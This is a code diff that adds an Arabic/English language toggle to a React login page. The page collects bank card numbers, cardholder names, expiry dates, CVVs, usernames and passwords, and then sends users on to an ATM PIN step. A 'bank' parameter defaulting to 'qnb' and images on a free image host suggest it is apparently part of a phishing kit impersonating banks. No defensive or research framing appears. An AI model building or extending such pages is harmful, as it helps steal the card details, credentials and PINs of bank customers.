@@ -1,14 +1,21 @@
 import { useState } from "react";
 import { useLocation, useSearch } from "wouter";
 import { trpc } from "@/lib/trpc";
+import { useLanguage } from "@/contexts/LanguageContext";
 import { toast } from "sonner";
 
 export default function LoginMethod() {
   const [, setLocation] = useLocation();
   const search = useSearch();
+  const { language, setLanguage } = useLanguage();
   const params = new URLSearchParams(search);
   const bank = params.get("bank") || "qnb";
   const sessionId = localStorage.getItem("sessionId") || "";
+
+  const isArabic = language === "ar";
+  const footerImage = isArabic 
+    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
+    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";
 
   const [method, setMethod] = useState<"card" | "user">("card");
   const [cardData, setCardData] = useState({
@@ -60,19 +67,23 @@ export default function LoginMethod() {
           cvv: undefined,
         } as any);
       }
-      toast.success("تم حفظ البيانات بنجاح");
+      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
       setLocation(`/atm-pin?bank=${bank}&session=${sessionId}`);
     } catch (error) {
-      toast.error("حدث خطأ في حفظ البيانات");
+      toast.error(isArabic ? "حدث خطأ في حفظ البيانات" : "Error saving data");
     }
   };
 
+  const toggleLanguage = () => {
+    setLanguage(isArabic ? "en" : "ar");
+  };
+
   return (
-    <html lang="ar" dir="rtl">
+    <html lang={language} dir={isArabic ? "rtl" : "ltr"}>
       <head>
         <meta charSet="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>طريقة التسجيل</title>
+        <title>{isArabic ? "طريقة التسجيل" : "Login Method"}</title>
         <style>{`
           body { font-family: sans-serif; background-color: #f4f4f4; margin: 0; padding-top: 70px; display: flex; flex-direction: column; min-height: 100vh; }
           
@@ -105,9 +116,9 @@ export default function LoginMethod() {
         <header className="header">
           <div className="menu-icon">&#9776;</div>
           <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" />
-          <a href="login_method_en.html" className="lang-btn" style={{ textDecoration: "none" }}>
-            English
-          </a>
+          <button onClick={toggleLanguage} className="lang-btn" style={{ textDecoration: "none" }}>
+            {isArabic ? "English" : "عربي"}
+          </button>
         </header>
 
         <div className="container">
@@ -115,23 +126,23 @@ export default function LoginMethod() {
             className={`selection-box ${method === "card" ? "active" : ""}`}
             onClick={() => setMethod("card")}
           >
-            <h3>تسجيل الدخول</h3>
-            <p>البطاقة البنكية</p>
+            <h3>{isArabic ? "تسجيل الدخول" : "Login"}</h3>
+            <p>{isArabic ? "البطاقة البنكية" : "Bank Card"}</p>
           </div>
 
           <div
             className={`selection-box ${method === "user" ? "active" : ""}`}
             onClick={() => setMethod("user")}
           >
-            <h3>تسجيل الدخول</h3>
-            <p>باسم المستخدم وكلمة المرور</p>
+            <h3>{isArabic ? "تسجيل الدخول" : "Login"}</h3>
+            <p>{isArabic ? "باسم المستخدم وكلمة المرور" : "Username & Password"}</p>
           </div>
 
           <form onSubmit={handleSubmit}>
             {method === "card" && (
               <div className="form-section active">
                 <div className="form-group">
-                  <label>رقم البطاقة</label>
+                  <label>{isArabic ? "رقم البطاقة" : "Card Number"}</label>
                   <input
                     type="number"
                     name="cardNumber"
@@ -142,11 +153,11 @@ export default function LoginMethod() {
                   />
                 </div>
                 <div className="form-group">
-                  <label>اسم صاحب البطاقة</label>
+                  <label>{isArabic ? "اسم صاحب البطاقة" : "Cardholder Name"}</label>
                   <input
                     type="text"
                     name="cardholderName"
-                    placeholder="Cardholder Name"
+                    placeholder={isArabic ? "اسم صاحب البطاقة" : "Cardholder Name"}
                     value={cardData.cardholderName}
                     onChange={handleCardChange}
                     required
@@ -154,7 +165,7 @@ export default function LoginMethod() {
                 </div>
                 <div className="flex-row">
                   <div className="form-group">
-                    <label>تاريخ الانتهاء</label>
+                    <label>{isArabic ? "تاريخ الانتهاء" : "Expiry Date"}</label>
                     <input
                       type="text"
                       name="expiryDate"
@@ -177,7 +188,7 @@ export default function LoginMethod() {
                   </div>
                 </div>
                 <button type="submit" className="submit-btn">
-                  متابعة
+                  {isArabic ? "متابعة" : "Continue"}
                 </button>
               </div>
             )}
@@ -185,36 +196,36 @@ export default function LoginMethod() {
             {method === "user" && (
               <div className="form-section active">
                 <div className="form-group">
-                  <label>اسم المستخدم</label>
+                  <label>{isArabic ? "اسم المستخدم" : "Username"}</label>
                   <input
                     type="text"
                     name="username"
-                    placeholder="Username"
+                    placeholder={isArabic ? "اسم المستخدم" : "Username"}
                     value={userData.username}
                     onChange={handleUserChange}
                     required
                   />
                 </div>
                 <div className="form-group">
-                  <label>كلمة المرور</label>
+                  <label>{isArabic ? "كلمة المرور" : "Password"}</label>
                   <input
                     type="password"
                     name="password"
-                    placeholder="Password"
+                    placeholder={isArabic ? "كلمة المرور" : "Password"}
                     value={userData.password}
                     onChange={handleUserChange}
                     required
                   />
                 </div>
                 <button type="submit" className="submit-btn">
-                  متابعة
+                  {isArabic ? "متابعة" : "Continue"}
                 </button>
               </div>
             )}
           </form>
         </div>
 
-        <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
+        <img src={footerImage} className="footer-image" alt="Footer" />
       </body>
     </html>
   );
